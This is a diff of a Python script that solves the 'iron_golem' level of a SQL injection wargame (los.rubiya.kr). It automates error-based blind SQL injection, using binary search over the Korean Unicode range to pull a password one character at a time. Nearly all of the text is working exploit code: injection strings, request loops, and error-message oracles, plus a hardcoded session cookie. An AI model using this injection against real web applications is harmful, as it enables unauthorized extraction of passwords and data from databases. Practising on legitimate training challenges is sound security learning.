@@ -4,55 +4,109 @@ import urllib.error
 import urllib.parse
 import codecs
 
-
-def iron_golem_bin_check(hdr,pw_index):
-    for bin_num in range(50,47,-1):
-        inject_sentence = "1' or if(ascii(substring(hex(pw)," + str(pw_index) + ",1))<"+ str(bin_num) + ",1,(select 1 union select 2)) -- "
-
-        params = urllib.parse.urlencode({"pw":inject_sentence})
+def iron_golem_other_char_check(hdr,pw_index,ans):
+    for ascii_char in range(33,128):
+        inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))=" + str(ascii_char) + ",1,(select 1 union select 2)) -- "
+        
+        params = urllib.parse.urlencode({"pw" : inject_sentence})
 
         url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params
-
+        
         print(url)
 
         request = urllib.request.Request(url, headers = hdr)
-        response = urllib.request.urlopen(request) 
+        response = urllib.request.urlopen(request)
 
         data = response.read()
         data = data.decode('utf-8')
 
-        if data.find("Subquery returns more than 1 row") != -1:
-            return chr(bin_num + 1)
+        if data.find("Subquery returns more than 1 row") == -1:
+            ans = ans + str(ascii_char) + " "
+            return ans
+
+def iron_golem_admin_check(hdr,pw_index,mid):
+    #해당 mid 값이 해당 자리에 맞는 값인지를 확인
+
+    inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))="+ str(mid) + ",1,(select 1 union select 2)) -- "
+
+    params = urllib.parse.urlencode({"pw":inject_sentence})
+
+    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params
+
+    print(url)
+
+    request = urllib.request.Request(url, headers = hdr)
+    response = urllib.request.urlopen(request) 
+
+    data = response.read()
+    data = data.decode('utf-8')
+
+    if data.find("Subquery returns more than 1 row") == -1:
+        ans = [1,mid]
+        return ans
+    
+    ans = [0,0]
+
+    return ans
                 
 #한글 유니코드값 10진수 범위 : 44032 ~ 50813
 
 def iron_golem(ans,hdr):
-    for pw_index in range(1,129):
-        bin_flag = iron_golem_bin_check(hdr,pw_index)
-        if(bin_flag == "0" or bin_flag == "1"):
-            ans = ans + bin_flag
-            print(ans)
-        else:
-            for ascii_char in range(128,0,-1):
-                inject_sentence = "1' or if(ascii(substring(hex(pw)," + str(pw_index) + ",1))<"+ str(ascii_char) + ",1,(select 1 union select 2)) -- "
+    for pw_index in range(1,18):
+        kor_range = [44032, 50813]
+        op = '<'
 
-                params = urllib.parse.urlencode({"pw":inject_sentence})
+        while(kor_range[0] != kor_range[1] and (kor_range[1]-kor_range[0])!=1):
+            mid = (kor_range[0] + kor_range[1]) // 2
 
-                url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params
+            admin_chk = iron_golem_admin_check(hdr,pw_index,mid)
+            
+            if(admin_chk[1] != 0):
+                ans = ans + str(admin_chk[1]) + " "
+                print(ans)
+                break
 
-                print(url)
+            inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))" + op + str(mid) + ",1,(select 1 union select 2)) -- "
 
-                request = urllib.request.Request(url, headers = hdr)
-                response = urllib.request.urlopen(request)
+            params = urllib.parse.urlencode({"pw":inject_sentence})
+
+            url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params
+
+            print(url)
+
+            request = urllib.request.Request(url, headers = hdr)
+            response = urllib.request.urlopen(request)
+            
+            data = response.read()
+            data = data.decode('utf-8')
+
+            if data.find("Subquery returns more than 1 row") == -1:
+                if(op == '<'):
+                    kor_range[1] = mid
+                elif(op == '>'):
+                    kor_range[0] = mid
+            else:
+                if(op == '<'): 
+                    op = '>'
+                elif(op == '>'):
+                    op = '<'
+
+        if(admin_chk[0] != 1):
+            for admin_index in kor_range:
+                admin_chk = iron_golem_admin_check(hdr,pw_index,admin_index)
                 
-                data = response.read()
-                data = data.decode('utf-8')
-
-                if data.find("Subquery returns more than 1 row") != -1:
-                    ans = ans + chr(ascii_char+1)
+                if(admin_chk[0] == 1):
+                    ans = ans + str(admin_chk[1]) + " "
                     print(ans)
                     break
 
+            ans = iron_golem_other_char_check(hdr,pw_index,ans)
+            print(ans)
+        
+                                                                                                                                                                                                                                                                             
+
+
+                
 def xavis(ans,hdr):
     for pw_index in range(1,25):
         for ascii_char in range(33,128):
@@ -388,7 +442,7 @@ def ch_choose(ch,ans,hdr):
 
 if __name__ == "__main__":
     ans = ""
-    cookie = "PHPSESSID=8curdn23fn1cef0bqc1cj41sj6"
+    cookie = "PHPSESSID=gr2mcui8jlm910ib5v6ogrk1n3"
     user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
     headers = {'User-Agent' : user_agent,'cookie':cookie}
 
